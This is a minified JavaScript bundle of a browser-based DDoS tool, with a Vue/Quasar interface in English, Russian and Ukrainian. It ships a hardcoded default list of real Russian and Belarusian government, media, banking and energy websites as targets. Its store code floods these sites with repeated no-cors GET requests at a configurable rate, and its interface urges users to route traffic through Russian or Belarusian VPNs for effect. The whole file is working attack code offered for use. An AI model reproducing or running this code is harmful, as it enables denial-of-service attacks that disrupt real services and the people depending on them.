(()=>{"use strict";var t={7590:(t,e,a)=>{a(8156),a(6509);var r=a(4779),s=a(7233),o=a(536);function n(t,e){const a=(0,o.up)("router-view");return(0,o.wg)(),(0,o.j4)(a)}var i=a(9895);const l={},c=(0,i.Z)(l,[["render",n]]),u=c;var d=a(2266),g=a(6780),p=a(8597);const f=[{name:"MainLayout",path:"/",component:()=>Promise.all([a.e(736),a.e(166)]).then(a.bind(a,2166)),children:[{name:"Index",path:"/",component:()=>a.e(780).then(a.bind(a,8780)),redirect:{name:"DdosConfig"}},{name:"AttackLayout",path:"/attack",component:()=>Promise.all([a.e(736),a.e(505)]).then(a.bind(a,3505)),redirect:{name:"Index"},children:[{name:"DdosConfig",path:"ddos/config",component:()=>Promise.all([a.e(736),a.e(131)]).then(a.bind(a,9131))},{name:"DdosAttack",path:"ddos/start",component:()=>Promise.all([a.e(736),a.e(422)]).then(a.bind(a,1422))}]}]},{path:"/:catchAll(.*)*",component:()=>Promise.all([a.e(736),a.e(837)]).then(a.bind(a,2143))}],m=f,h=(0,g.BC)((function(){const t=p.PO,e=(0,p.p7)({scrollBehavior:()=>({left:0,top:0}),routes:m,history:t("/")});return e}));async function b(t,e){const r="function"===typeof d["default"]?await(0,d["default"])({}):d["default"],{storeKey:o}=await Promise.resolve().then(a.bind(a,2266)),n="function"===typeof h?await h({store:r}):h;r.$router=n;const i=t(u);return i.use(s.Z,e),{app:i,store:r,storeKey:o,router:n}}var w=a(1712),v=a(652);const k={config:{},plugins:{Notify:w.Z,Dialog:v.Z}},y="/";async function L({app:t,router:e,store:a,storeKey:r},s){let o=!1;const n=t=>{try{return e.resolve(t).href}catch(a){}return Object(t)===t?null:t},i=t=>{if(o=!0,"string"===typeof t&&/^https?:\/\//.test(t))return void(window.location.href=t);const e=n(t);null!==e&&(window.location.href=e)},l=window.location.href.replace(window.location.origin,"");for(let u=0;!1===o&&u<s.length;u++)try{await s[u]({app:t,router:e,store:a,ssrContext:null,redirect:i,urlPath:l,publicPath:y})}catch(c){return c&&c.url?void i(c.url):void console.error("[Quasar] boot error:",c)}!0!==o&&(t.use(e),t.use(a,r),t.mount("#q-app"))}b(r.ri,k).then((t=>Promise.all([Promise.resolve().then(a.bind(a,4615)),Promise.resolve().then(a.bind(a,7917))]).then((e=>{const a=e.map((t=>t.default)).filter((t=>"function"===typeof t));L(t,a)}))))},4615:(t,e,a)=>{a.r(e),a.d(e,{default:()=>d,i18n:()=>c});var r=a(6780),s=a(2496);const o={attackPage:{pageTitle:"DDOS Dashboard",stopBtnLabel:"Stop",actionsHint:"Stop/Start can take up to 1 minute",startBtnLabel:"Start",statusTitle:"Status",ddosAttackConfigureBtnLabel:"Attack setting",attackActiveStatusLabel:"Active",attackStoppedStatusLabel:"Stopped",resultsCardTitle:"Results",table:{target:"Target",success:"Success requests",errors:"Errors count"},totalResults:{error:"Errors",success:"Successful requests"}},attackConfigPage:{pageTitle:"DDOS Configuration",connectionsTitle:"Connections",reqCountFieldLabel:"Request limit per interval",reqCountFieldHint:"Recommended quantity - 100",streamsCountLabel:"Streams count",streamsCountHint:"In development",resetConfigBtnLabel:"Reset",startAttackBtnLabel:"Start attack",intervalTimeFieldLabel:"Interval length",intervalTimeFieldHint:"In milliseconds",removeAllTargetsBtnLabel:"Remove All Targets",targetsCardTitle:"Targets",addTargetFieldLabel:"Link/ip to target",addTargetBtnLabel:"Add",targetTooltipText:"Click to open in a new tab",invalidTargetNotify:"It doesn`t look like a url or ip address",targetaAreadyAddedNotify:"Target already added",targetAddedNotify:"Target added",errorReqDefaultNotify:"Error requesting default targets",attackStartedDialog:{title:"Attack started",description:'Until you press the "Stop" button or close the tab, the attack will be active. Startup may take up to 1 minute',okBtnLabel:"Ok"}},updatesNotify:{title:"New Version",message:"We have released a new version of the application. The attack will resume immediately after the update",okBtnLabel:"Update now",cancelBtnLabel:"Later"},nav:{ddosDasboardLabel:"DDOS Dashboard",ddosConfigLabel:"DDOS Config"},ipNotify:{title:"Use VPN with Russian or Belarusian IP for more effective attack",ipLabel:"Your IP",countryLabel:"IP Country",reloadBtnLabel:"Reload",updatedAtLabel:"Last updated at"}},n={attackPage:{pageTitle:"Панель управления DDOS",stopBtnLabel:"Остановить",startBtnLabel:"Начать",ddosAttackConfigureBtnLabel:"Настроить атаку",actionsHint:"Остановка/Начало могут занять до 1 минуты",statusTitle:"Статус",attackActiveStatusLabel:"Атака в процессе",attackStoppedStatusLabel:"Остановлена",resultsCardTitle:"Результаты атаки",table:{target:"Цель",success:"Успешных запросов",errors:"Ошибок"},totalResults:{error:"Ошибок",success:"Успешных запросов"}},attackConfigPage:{pageTitle:"Настройка DDOS",connectionsTitle:"Запросы",reqCountFieldLabel:"Лимит запросов за интервал",reqCountFieldHint:"Рекомендуемое количество - 100",streamsCountLabel:"Количство потоков",streamsCountHint:"В разработке",resetConfigBtnLabel:"Восстановить по умолчанию",startAttackBtnLabel:"Начать атаку",intervalTimeFieldLabel:"Длина интервала",intervalTimeFieldHint:"В миллисекундах",removeAllTargetsBtnLabel:"Удалить все цели",targetsCardTitle:"Цели",addTargetFieldLabel:"Ссылка или IP",addTargetBtnLabel:"Добавить",targetTooltipText:"Нажмите, чтобы открыть в новой вкладке",invalidTargetNotify:"Это не похоже на URL или IP адрес",targetaAreadyAddedNotify:"Цель уже добавлена",targetAddedNotify:"Цель добавлена",errorReqDefaultNotify:"Ошибка при запросе целей по умолчанию",attackStartedDialog:{title:"Атака началась",description:'Пока вы не нажмете кнопку "Стоп" или не закроете вкладку, атака будет активной. Запуск может занять до 1 минуты',okBtnLabel:"Ок"}},updatesNotify:{title:"Новая версия",message:"Мы выпустили новую версию приложения. Атака возобновиться сразу же после обновления",okBtnLabel:"Обновить сейчас",cancelBtnLabel:"Позже"},nav:{ddosDasboardLabel:"Управление DDOS",ddosConfigLabel:"Настройка DDOS"},ipNotify:{title:"Используйте VPN с российским или белорусским IP для более эффективной атаки",ipLabel:"Ваш IP",countryLabel:"IP нахожиться в",reloadBtnLabel:"Обновить",updatedAtLabel:"Последнее обновление в"}},i={attackPage:{pageTitle:"Панель керування DDOS",stopBtnLabel:"Зупинити",startBtnLabel:"Почати",ddosAttackConfigureBtnLabel:"Налаштувати атаку",actionsHint:"Зупинка/Початок може тривати до 1 хвилини",statusTitle:"Статус",attackActiveStatusLabel:"Атака в процесі",attackStoppedStatusLabel:"Зупинено",resultsCardTitle:"Результати атаки",table:{target:"Мета",success:"Успішних запитів",errors:"Помилок"},totalResults:{error:"Помилок",success:"Успішних запитів"}},attackConfigPage:{pageTitle:"Налаштування DDOS",connectionsTitle:"Запити",reqCountFieldLabel:"Ліміт запитів за інтервал",reqCountFieldHint:"Рекомендована кількість - 100",streamsCountLabel:"Кількість потоків",streamsCountHint:"У розробці",intervalTimeFieldLabel:"Довжина інтервалу",intervalTimeFieldHint:"У мілісекундах",resetConfigBtnLabel:"Відновити за замовчуванням",startAttackBtnLabel:"Почати атаку",removeAllTargetsBtnLabel:"Видалити всі цілі",targetsCardTitle:"Цілі",addTargetFieldLabel:"Посилання або IP",addTargetBtnLabel:"Додати",targetTooltipText:"Натисніть, щоб відкрити нову вкладку",invalidTargetNotify:"Це не схоже на URL або IP адресу",tarjetaAreadyAddedNotify:"Мета вже додана",targetAddedNotify:"Мета додана",errorReqDefaultNotify:"Помилка за запитом стандартних цілей",attackStartedDialog:{title:"Атака почалася",description:'Поки ви не натиснете кнопку "Стоп" або не закриєте вкладку, атака буде активною. Запуск може тривати до 1 хвилини',okBtnLabel:"Ок"}},updatesNotify:{title:"Нова версія",message:"Ми випустили нову версію програми. Атака відновиться відразу після оновлення",okBtnLabel:"Оновити зараз",cancelBtnLabel:"Пізніше"},nav:{ddosDasboardLabel:"Керування DDOS",ddosConfigLabel:"Налаштування DDOS"},ipNotify:{title:"Використовуйте VPN з російським або білоруським IP для більш ефективної атаки",ipLabel:"Ваш IP",countryLabel:"IP знаходиться в",reloadBtnLabel:"Оновити",updatedAtLabel:"Останнє оновлення"}},l={en:o,ru:n,ua:i};let c,u=localStorage.getItem("lang")||navigator.language||navigator.userLanguage;-1===Object.keys(l).indexOf(u)&&(u="en");const d=(0,r.xr)((({app:t})=>{c=(0,s.o)({legacy:!1,locale:u,messages:l}),t.use(c)}))},7917:(t,e,a)=>{a.r(e),a.d(e,{default:()=>u});var r=a(6780),s=a(1539),o=a(1651);let n,i=!1;const l=async()=>{try{const t=await fetch("/app.config.json"),e=await t.json();return e.version}catch(t){return console.error(t),"1.0.0"}},c=async()=>{if(i)return;i=!0;const t=await(0,s.V)({title:(0,o.a)("updatesNotify.title")+" 1.0.0",message:(0,o.a)("updatesNotify.message"),okLabel:(0,o.a)("updatesNotify.okBtnLabel"),cancelLabel:(0,o.a)("updatesNotify.cancelBtnLabel")});if(!t)return clearInterval(n),void(i=!1);location.reload()},u=(0,r.xr)((({app:t})=>{n=setInterval((async()=>{const t=await l();"1.0.0"!==t&&c()}),5e3)}))},1539:(t,e,a)=>{a.d(e,{V:()=>s});var r=a(652);const s=async({title:t,message:e,okLabel:a,cancelLabel:s})=>await new Promise((o=>{r.Z.create({title:t,message:e,cancel:!!s,ok:{label:a,noCaps:!0,color:"dark"},cancel:{label:s,noCaps:!0,flat:!0,color:"red"}}).onOk((()=>{o(!0)})).onOk((()=>{o(!0)})).onCancel((()=>{o(!1)})).onDismiss((()=>{o(!1)}))}))},1651:(t,e,a)=>{a.d(e,{a:()=>s});var r=a(4615);const s=t=>r.i18n.global.t(t)},2266:(t,e,a)=>{a.r(e),a.d(e,{default:()=>G});var r={};a.r(r),a.d(r,{getBrowserAttackIntervalId:()=>m,getBrowserAttackResults:()=>f,getBrowserAttackStatus:()=>p,getCommonResultsBrowserAttack:()=>h,getDdosConfig:()=>d,getResultsBrowserAttack:()=>g,getTargetsList:()=>u});var s={};a.r(s),a.d(s,{removeAllTargets:()=>S,removeTarget:()=>D,resetDdosConfig:()=>O,setBrowserAttackIntervalId:()=>x,setBrowserAttackStatus:()=>q,setCommonResultsBrowserAttack:()=>R,setDdosConfig:()=>N,setInitTargets:()=>I,setResultsBrowserAttack:()=>j,setTarget:()=>P});var o={};a.r(o),a.d(o,{destroyBrowserAttack:()=>M,initBrowserAttack:()=>U,setDefaultTargets:()=>V});var n=a(6780),i=a(3721),l=a(4883);function c(){return{targetsList:[],config:{user:{},default:{reqCount:100,intervalLength:300}},resultsBrowserAttack:{},commonResultsBrowserAttack:{success:0,error:0},browserAttackStatus:!1,browserAttackIntervalId:null}}a(6509);const u=t=>t.targetsList,d=t=>t.config,g=t=>t.resultsBrowserAttack,p=t=>t.browserAttackStatus,f=t=>Object.entries(t.resultsBrowserAttack).map((([t,e])=>({target:t,...e}))),m=t=>t.browserAttackIntervalId,h=t=>t.commonResultsBrowserAttack;var b=a(1712);const w={timeout:1500,progress:!0,actions:[{icon:"close",color:"white"}]},v=t=>(b.Z.create({type:"negative",message:t,...w}),!0),k=t=>{b.Z.create({message:t,...w})};a(7918);var y=a(7790),L=a.n(y),A=a(3245),C=a.n(A),T=a(1651);const B=(t,e)=>{if(t)if(L()(t)||C()(t)){if(!(e.indexOf(t.trim())>-1))return!0;v((0,T.a)("attackConfigPage.targetaAreadyAddedNotify"))}else v((0,T.a)("attackConfigPage.invalidTargetNotify"))},S=t=>{t.targetsList=[]},D=(t,e)=>{t.targetsList.splice(e,1)},P=(t,{target:e,callback:a})=>{t.targetsList.indexOf(e)>0||B(e,t.targetsList)&&(t.targetsList.unshift(e),k((0,T.a)("attackConfigPage.targetAddedNotify")),a&&a())},I=(t,e)=>{S(t),t.targetsList.push(...e)},N=(t,e)=>{for(const a in e)e[a]=Number(e[a]);t.config.user=e},O=t=>{t.config.user=t.config.default},R=(t,e)=>{t.commonResultsBrowserAttack[e]++},j=(t,e)=>{const a=t.resultsBrowserAttack;for(const r in e){a[r]||(a[r]={success:0,error:0});const s=e[r]?"success":"error";a[r][s]++,R(t,s)}},q=(t,e)=>{t.browserAttackStatus=e},x=(t,e)=>{t.browserAttackIntervalId=e},F=async()=>["https://lenta.ru/","https://ria.ru/","https://ria.ru/lenta/","https://www.rbc.ru/","https://www.rt.com/","http://kremlin.ru/","http://en.kremlin.ru/","https://smotrim.ru/","https://tass.ru/","https://tvzvezda.ru/","https://vsoloviev.ru/","https://www.1tv.ru/","https://www.vesti.ru/","https://online.sberbank.ru/","https://sberbank.ru/","https://zakupki.gov.ru/","https://www.gosuslugi.ru/","https://er.ru/","https://www.rzd.ru/","https://rzdlog.ru/","https://vgtrk.ru/","https://www.interfax.ru/","https://www.mos.ru/uslugi/","http://government.ru/","https://mil.ru/","https://www.nalog.gov.ru/","https://customs.gov.ru/","https://pfr.gov.ru/","https://rkn.gov.ru/","https://www.gazprombank.ru/","https://www.vtb.ru/","https://www.gazprom.ru/","https://lukoil.ru","https://magnit.ru/","https://www.nornickel.com/","https://www.surgutneftegas.ru/","https://www.tatneft.ru/","https://www.evraz.com/ru/","https://nlmk.com/","https://www.sibur.ru/","https://www.severstal.com/","https://www.metalloinvest.com/","https://nangs.org/","https://rmk-group.ru/ru/","https://www.tmk-group.ru/","https://ya.ru/","https://www.polymetalinternational.com/ru/","https://www.uralkali.com/ru/","https://www.eurosib.ru/","https://ugmk.ua/","https://omk.ru/","https://sputniknews.com/","https://lt.sputniknews.ru/","https://baltnews.lt/","https://sputniknews.ru/","https://regnum.ru/\t","https://iz.ru/","https://eadaily.com/","https://www.rubaltic.ru/","http://www.fsb.ru/","https://president.gov.by/ru","https://yandex.ru/maps","https://yandex.ru/"];a(1832);var E=a(1539);const H={},_=t=>{if(!H[t])return H[t]={error:0,success:0,unconfirmCount:0},!0;const e=!(0===H[t]["success"]&&H[t]["error"]>30),a=200;return!e&&H[t].unconfirmCount<=a?H[t].unconfirmCount++:!e&&H[t].unconfirmCount>a&&(H[t].error=0,e=!0),e},z=async(t,e)=>await new Promise(((a,r)=>{if(!e.getters.getBrowserAttackStatus)return void a({});const s={},o=[];for(let i=0;i<t.length;i++)try{if(!e.getters.getBrowserAttackStatus)return void a({});const r=t[i];if(!_(r))continue;o.push(r);const n=new AbortController,l=setTimeout((()=>n.abort()),1e4);fetch(r,{method:"GET",mode:"no-cors",signal:n.signal}).then((()=>{s[r]=!0,H[r].success++})).catch((()=>{s[r]=!1,H[r].error++})).finally((()=>{clearTimeout(l),e.getters.getBrowserAttackStatus?Object.keys(s).length===o.length&&a(s):a(s)}))}catch(n){console.error(n)}})),Z=()=>{(0,E.V)({title:(0,T.a)("attackConfigPage.attackStartedDialog.title"),message:(0,T.a)("attackConfigPage.attackStartedDialog.description"),okLabel:(0,T.a)("attackConfigPage.attackStartedDialog.okBtnLabel")})},V=async t=>{try{if(t.getters.getTargetsList.length>0)return;const e=await F();t.commit("setInitTargets",e)}catch(e){v((0,T.a)("attackConfigPage.errorReqDefaultNotify")),console.error(e)}},U=t=>{const e=t.getters.getDdosConfig.user,a=t.getters.getTargetsList;if(0===a.length)return;const r=t.getters.getBrowserAttackIntervalId;t.commit("setBrowserAttackStatus",!0);let s=0;const o=setInterval((async()=>{if(!t.getters.getBrowserAttackStatus)return;const r=s>=a.length?0:s+1,o=r+e.reqCount;s=o;const n=a.slice(r,o),i=await z(n,t);t.commit("setResultsBrowserAttack",i)}),Number(e.intervalLength)?Number(e.intervalLength):1e3);t.commit("setBrowserAttackIntervalId",o),r||setTimeout((()=>{Z()}),1e3)},M=t=>{const e=t.getters.getBrowserAttackIntervalId;clearInterval(e),t.commit("setBrowserAttackIntervalId",null),t.commit("setBrowserAttackStatus",!1)},K={namespaced:!0,state:c,getters:r,mutations:s,actions:o},G=(0,n.h)((function(){const t=new l.ZP({storage:window.localStorage}),e=(0,i.MT)({modules:{ddos:K},plugins:[t.plugin],strict:!1});return e}))}},e={};function a(r){var s=e[r];if(void 0!==s)return s.exports;var o=e[r]={exports:{}};return t[r](o,o.exports,a),o.exports}a.m=t,(()=>{var t=[];a.O=(e,r,s,o)=>{if(!r){var n=1/0;for(u=0;u<t.length;u++){for(var[r,s,o]=t[u],i=!0,l=0;l<r.length;l++)(!1&o||n>=o)&&Object.keys(a.O).every((t=>a.O[t](r[l])))?r.splice(l--,1):(i=!1,o<n&&(n=o));if(i){t.splice(u--,1);var c=s();void 0!==c&&(e=c)}}return e}o=o||0;for(var u=t.length;u>0&&t[u-1][2]>o;u--)t[u]=t[u-1];t[u]=[r,s,o]}})(),(()=>{a.n=t=>{var e=t&&t.__esModule?()=>t["default"]:()=>t;return a.d(e,{a:e}),e}})(),(()=>{a.d=(t,e)=>{for(var r in e)a.o(e,r)&&!a.o(t,r)&&Object.defineProperty(t,r,{enumerable:!0,get:e[r]})}})(),(()=>{a.f={},a.e=t=>Promise.all(Object.keys(a.f).reduce(((e,r)=>(a.f[r](t,e),e)),[]))})(),(()=>{a.u=t=>"js/"+t+"."+{131:"e5cae807",166:"4258446d",422:"eae7ab67",505:"0d478b7f",780:"d95d6502",837:"99a7429f"}[t]+".js"})(),(()=>{a.miniCssF=t=>"css/"+({143:"app",736:"vendor"}[t]||t)+"."+{131:"7d3fd480",143:"4cf142da",505:"043d59a9",736:"f35281a0"}[t]+".css"})(),(()=>{a.g=function(){if("object"===typeof globalThis)return globalThis;try{return this||new Function("return this")()}catch(t){if("object"===typeof window)return window}}()})(),(()=>{a.o=(t,e)=>Object.prototype.hasOwnProperty.call(t,e)})(),(()=>{var t={},e="attack-ui-app:";a.l=(r,s,o,n)=>{if(t[r])t[r].push(s);else{var i,l;if(void 0!==o)for(var c=document.getElementsByTagName("script"),u=0;u<c.length;u++){var d=c[u];if(d.getAttribute("src")==r||d.getAttribute("data-webpack")==e+o){i=d;break}}i||(l=!0,i=document.createElement("script"),i.charset="utf-8",i.timeout=120,a.nc&&i.setAttribute("nonce",a.nc),i.setAttribute("data-webpack",e+o),i.src=r),t[r]=[s];var g=(e,a)=>{i.onerror=i.onload=null,clearTimeout(p);var s=t[r];if(delete t[r],i.parentNode&&i.parentNode.removeChild(i),s&&s.forEach((t=>t(a))),e)return e(a)},p=setTimeout(g.bind(null,void 0,{type:"timeout",target:i}),12e4);i.onerror=g.bind(null,i.onerror),i.onload=g.bind(null,i.onload),l&&document.head.appendChild(i)}}})(),(()=>{a.r=t=>{"undefined"!==typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(t,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(t,"__esModule",{value:!0})}})(),(()=>{a.p="/"})(),(()=>{var t=(t,e,a,r)=>{var s=document.createElement("link");s.rel="stylesheet",s.type="text/css";var o=o=>{if(s.onerror=s.onload=null,"load"===o.type)a();else{var n=o&&("load"===o.type?"missing":o.type),i=o&&o.target&&o.target.href||e,l=new Error("Loading CSS chunk "+t+" failed.\n("+i+")");l.code="CSS_CHUNK_LOAD_FAILED",l.type=n,l.request=i,s.parentNode.removeChild(s),r(l)}};return s.onerror=s.onload=o,s.href=e,document.head.appendChild(s),s},e=(t,e)=>{for(var a=document.getElementsByTagName("link"),r=0;r<a.length;r++){var s=a[r],o=s.getAttribute("data-href")||s.getAttribute("href");if("stylesheet"===s.rel&&(o===t||o===e))return s}var n=document.getElementsByTagName("style");for(r=0;r<n.length;r++){s=n[r],o=s.getAttribute("data-href");if(o===t||o===e)return s}},r=r=>new Promise(((s,o)=>{var n=a.miniCssF(r),i=a.p+n;if(e(n,i))return s();t(r,i,s,o)})),s={143:0};a.f.miniCss=(t,e)=>{var a={131:1,505:1};s[t]?e.push(s[t]):0!==s[t]&&a[t]&&e.push(s[t]=r(t).then((()=>{s[t]=0}),(e=>{throw delete s[t],e})))}})(),(()=>{var t={143:0};a.f.j=(e,r)=>{var s=a.o(t,e)?t[e]:void 0;if(0!==s)if(s)r.push(s[2]);else{var o=new Promise(((a,r)=>s=t[e]=[a,r]));r.push(s[2]=o);var n=a.p+a.u(e),i=new Error,l=r=>{if(a.o(t,e)&&(s=t[e],0!==s&&(t[e]=void 0),s)){var o=r&&("load"===r.type?"missing":r.type),n=r&&r.target&&r.target.src;i.message="Loading chunk "+e+" failed.\n("+o+": "+n+")",i.name="ChunkLoadError",i.type=o,i.request=n,s[1](i)}};a.l(n,l,"chunk-"+e,e)}},a.O.j=e=>0===t[e];var e=(e,r)=>{var s,o,[n,i,l]=r,c=0;if(n.some((e=>0!==t[e]))){for(s in i)a.o(i,s)&&(a.m[s]=i[s]);if(l)var u=l(a)}for(e&&e(r);c<n.length;c++)o=n[c],a.o(t,o)&&t[o]&&t[o][0](),t[o]=0;return a.O(u)},r=self["webpackChunkattack_ui_app"]=self["webpackChunkattack_ui_app"]||[];r.forEach(e.bind(null,0)),r.push=e.bind(null,r.push.bind(r))})();var r=a.O(void 0,[736],(()=>a(7590)));r=a.O(r)})();